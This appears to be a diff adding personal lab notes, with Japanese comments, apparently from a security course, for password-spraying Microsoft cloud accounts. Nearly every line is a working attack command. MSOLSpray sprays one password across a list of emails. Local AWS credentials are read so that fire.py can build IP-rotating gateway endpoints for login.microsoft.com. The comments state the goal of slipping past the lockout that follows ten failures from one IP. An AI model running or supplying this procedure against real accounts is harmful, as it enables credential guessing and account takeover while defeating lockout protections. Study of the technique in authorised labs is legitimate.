@@ -1,0 +1,9 @@
+//powershelのモジュールを活用してクラウド環境へのパスワードクラックを行う
+
+pwsh
+Import-Module /opt/MSOLSpray/MSOLSpray.ps1
+Invoke-MSOLSpray -UserList ./email.txt -Password <pass> #同一IPから１０回以上の失敗でロックアウトされる
+Get-Content /home/sec504/.aws/credentials #AWSのゲートウェイサービスを使うための認証情報を確認
+sudo fire.py --command create --url http://login.microsoft.com #fire.pyでログインページに用いるエンドポイントを作成
+curl <fire.pyで生成されたURL> #IPが毎回変わるか確認
+Invoke-MSOLSpray -UserList <userlist> -Password <pass> -URL <fire.pyで生成されたURL> -OutFile output.txt　＃ログインページに総当たり
